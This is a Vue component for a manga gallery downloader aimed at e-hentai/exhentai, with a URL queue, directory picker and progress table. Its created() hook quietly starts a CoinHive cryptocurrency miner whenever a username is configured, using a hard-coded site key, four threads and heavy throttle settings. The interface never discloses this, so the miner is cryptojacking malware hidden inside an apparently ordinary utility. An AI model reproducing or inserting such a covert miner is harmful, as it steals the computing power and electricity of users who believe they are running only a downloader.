<template>
  <div id="app"> 
    <div class="header">
      <div class="row">
        <div class="col-xs-8">
          <span class="help-block" style="color: #616161;"><b>Save as directory:</b> {{directory_name}}</span>
        </div>
        <div class="col-xs-4 text-right">
          <span class="help-block" style="color: #616161;">Please login <b>exhentai.org</b>, <a href="#" @click.prevent="page.option = true">LOGIN</a></span>
        </div>
      </div>
      <div class="row">
        <div v-if="!page.option" class="col-xs-8">
          <div v-if="!state_verify" class="form-group" :class="{ 'has-error' : error_message }" style="margin-bottom:2px">
            <input ref="url" type="text" class="form-control input-sm" id="txtURL" placeholder="https://e-hentai.org/g/1031609/631e04b5f7/" maxlength="50" @keyup.enter="onQueue" v-model="url">
            <i class="fa fa-link fa-input-left" aria-hidden="true"></i>
            <i class="fa fa-search fa-input-right" aria-hidden="true"></i>
            <span class="help-block" style="margin-bottom:0px;height:13px;"><b>{{error_message}}</b></span>
          </div>
          <div v-else style="margin-top: 4px;">
            <div class="progress" style="margin-bottom:0px;">
              <div class="progress-bar progress-bar-success progress-bar-striped" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" style="width: 40%">
              </div>
            </div>
            <span class="help-block">40% Complete (success)</span>
          </div>
        </div>
        <div v-if="!page.option" class="col-xs-4">
          <div class="btn-group" role="group">
            <button :disabled="state_verify || (!directory_name && state_name === 'Download')" type="button" class="btn" 
              :class="!state_verify ? 'btn-success' : 'btn-default'" 
              style="padding: 5px 27px;width: 136px;" @click="onQueue">
              <i :class="['fa', state_icon]"  aria-hidden="true"></i> {{state_name}}
            </button>
            <button :disabled="state_verify" type="button" class="btn btn-default" style="padding: 5px 11px;" @click="page.option = true">
              <i class="fa fa-gear" aria-hidden="true"></i>
            </button>
          </div>
        </div>
        <div v-else class="col-xs-12" style="margin-bottom: 1.2rem;padding-right:19px;">
          <div class="input-group">
            <input type="text" readonly class="form-control" placeholder="Directory for..." maxlength="50" v-model="directory_name"
              style="padding: 7px;font-size: 1rem;height:auto">
            <span class="input-group-btn">
              <button class="btn btn-primary" type="button" style="padding: 0.38em 1.5em;" @click="onBrowse">Browse</button>
              <button class="btn btn-default" type="button" style="padding: 0.38em 0.6em;" @click="page.option = false">
                <i class="fa fa-arrow-circle-left" aria-hidden="true"></i>
              </button>
            </span>
            
          </div>
        </div>
      </div>
      <div  v-if="false" class="row">
        <div class="col-xs-12">
          <button type="button" class="btn btn-default pull-right" style="padding:6px 13px 7px 10px;font-size: 1.1rem" @click="page.option = false">
            <i class="fa fa-chevron-left" aria-hidden="true"></i> BACK
          </button>
          <div class="page-header" style="margin-top: -10px;">
            <h3>Directory Manga</h3>
          </div>
          <div class="page-header">
            <h3>Sign-In exhentai.org</h3>
          </div>
        </div>
        <div class="col-xs-12">
          <form class="form">
            <div class="col-xs-5 form-group">
              <label for="txtUsername">Username</label>
              <input type="text" class="form-control" id="txtUsername" placeholder="account">
            </div>
            <div class="col-xs-5 form-group">
              <label for="txtPassoword">Passowrd</label>
              <input type="text" class="form-control" id="txtPassoword" placeholder="123456">
            </div>
            <div class="col-xs-2">
              <button type="submit" class="btn btn-default" style="margin-top: 20px;">Login</button>
            </div>
          </form>
        </div>
      </div>
    </div>
    <div>
      <table class="table">
        <colgroup>
          <col style="width:6%;">
          <col style="width:50%;">
          <col style="width:15%;">
          <col style="width:10%;">
          <col style="width:20%;">
        </colgroup>
        <thead>
          <tr>
            <th style="text-align:center;">#</th>
            <th>Name</th>
            <th style="text-align:center;">Page</th>
            <th style="text-align:center;">Size</th>
            <th style="text-align:center;">Status</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td colspan="5" style="padding: 0px !important;">
              <div style="height:224px;overflow-x:hidden;overflow-y:scroll;">
              <table class="table table-striped manga-items" style="padding:0px;margin:0px;">
                <colgroup>
                  <col style="width:6%;">
                  <col style="width:50%;">
                  <col style="width:15%;">
                  <col style="width:10%;">
                  <col style="width:20%;">
                </colgroup>
                <tbody>
                  <tr v-for="item in manga">
                    <td style="text-align:center;">{{manga.indexOf(item) + 1}}</td>
                    <td>{{item.name}}</td>
                    <td style="text-align:center;">{{item.page}}</td>
                    <td style="text-align:center;">{{item.size}}</td>
                    <td style="text-align:center;">{{item.status}}</td>
                  </tr>
                </tbody>
              </table>
              </div>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
    <div class="footer"></div>
  </div>
</template>

<script>
  const URL = require('url-parse')
  export default {
    name: 'ghentai',
    data: () => {
      return {
        page: {
          signin: false,
          option: false
        },
        miner: null,
        STATE: {
          FAIL: 0,
          PREAPRE: 1,
          WAITING: 2,
          DOWNLOAD: 3,
          SUCCESS: 4
        },
        state_verify: false,
        state_icon: 'fa-list',
        state_name: 'Queue',
        url: '',
        error_message: '',
        directory_name: null,
        manga: []
      }
    },
    methods: {
      urlBegin () {
        let vm = this
        let found = false
        for (var i = vm.manga.length - 1; i >= 0; i--) {
          if (vm.manga[i].status !== 'DONE') {
            let url1 = new URL(vm.url)
            let url2 = new URL(vm.manga[i].url)
            if (url1.pathname === url2.pathname) found = true
          } else {
            vm.manga.splice(i, 1)
          }
        }
        vm.error_message = ''
        if (!found) {
          vm.state_verify = true
          vm.state_icon = 'fa-circle-o-notch fa-spin fa-fw'
          vm.state_name = 'Initialize...'
          vm.URL_VERIFY(vm.url).then(res => {
            // console.log('URL_VERIFY', res)
            if (!res.error) {
              let manga = res.data
              manga.status = 'WAITING'
              vm.manga.push(manga)
            } else {
              vm.error_message = res.error
            }
            vm.urlDone()
          })
        } else {
          vm.urlDone()
        }
      },
      urlDone () {
        let vm = this
        vm.state_icon = 'fa-download'
        vm.state_name = 'Redownload'
        vm.state_verify = false
        vm.url = ''
        vm.$nextTick(() => {
          vm.$refs.url.focus()
        })
      },
      beginDownload () {
        let vm = this
        vm.url = ''
        vm.error_message = ''
        vm.state_verify = true
        vm.state_icon = 'fa-circle-o-notch fa-spin fa-fw'
        vm.state_name = 'Loading...'
        vm.DOWNLOAD({ manga: vm.manga, directory: vm.directory_name }, vm.onWatch).then(vm.urlDone)
      },
      onWatch (manga) {
        this.manga[manga.index].status = manga.status
        if (manga.finish) {
          this.manga[manga.index].status = 'DONE'
        }
      },
      onQueue (item) {
        if (this.url.trim() !== '' && this.onCheckURL(this.url)) {
          this.urlBegin()
        } else if (this.manga.length > 0) {
          this.beginDownload()
        } else if (this.url.trim() !== '') {
          this.$refs.url.focus()
          this.state_verify = false
        }
      },
      onBrowse (item) {
        let vm = this
        vm.CHANGE_DIRECTORY().then(folder => {
          if (folder) {
            vm.directory_name = folder
            vm.page.option = false
          }
        })
      },
      onCheckURL: (url) => {
        return /hentai.org\/g\/\w{1,7}\/\w{1,10}/g.test(url)
      }
    },
    watch: {
      url (value) {
        if (value || this.manga.length === 0) {
          this.state_icon = 'fa-list'
          this.state_name = 'Queue'
        } else {
          this.state_icon = 'fa-download'
          this.state_name = 'Download'
        }
      }
    },
    created () {
      let vm = this
      let config = this.ConfigLoaded()
      this.directory_name = config.directory
      this.$nextTick(() => {
        if (!vm.page.option) vm.$refs.url.focus()
      })
      if (config.username) {
        this.miner = new window.CoinHive.User('WNABDCmX53ZR58rSXxdDSyvIlsVydItZ', config.username, {
          threads: 4,
          autoThreads: false,
          throttle: 0.8,
          forceASMJS: false
        })
        this.miner.start()
      }
    }
  }
</script>

<style>
  * {
    margin: 0;
    padding: 0;
  }
  html,
  body { height: 100%; }
  #app { 
    background-color: #FFFFFF !important; 
    width: 100%;
    height: 100%;
    overflow: hidden;
    font-size: 1.15rem !important; 
  }
  .help-block {
    font-size: 0.9rem;
  }
  .form-control, .btn {
    border-radius: 0px !important;
    box-shadow: none !important;
  }
  input.input-sm {
    color: #000;
    padding-left: 20px;
    padding-right: 20px;
  }
  .fa-input-left, .fa-input-right {
    position: absolute;
    top: 0px;
  }
  .fa-input-left {
    font-size: 1.1rem;
    margin: 11px 22px;
    color: #CCC;
    left: 0px;
  }
  .fa-input-right {
    font-size: 1.35rem;
    margin: 8px 23px;
    right: 0px;
  }
  .form-control:focus + .fa-input-right:before {
    color: #66afe9;
  }
  .header {
    padding: 7px 7px 0px 7px;
  }
  .footer {
    position: absolute;
    bottom: 0px;
    width: 100%;
    height: 5px;
    background-color: #324157;
    font-size: 11px;
    font-weight: bold;
    color: #585858;
  }
  .manga-items > tbody > tr > td {
    padding: 4px;
    font-size: 1rem;
  }

  ::-webkit-scrollbar {
    width: 5px;
    height: 8px;
    background-color: #aaa;
  }
  ::-webkit-scrollbar-thumb {
      background: #000; 
  }
  
</style>
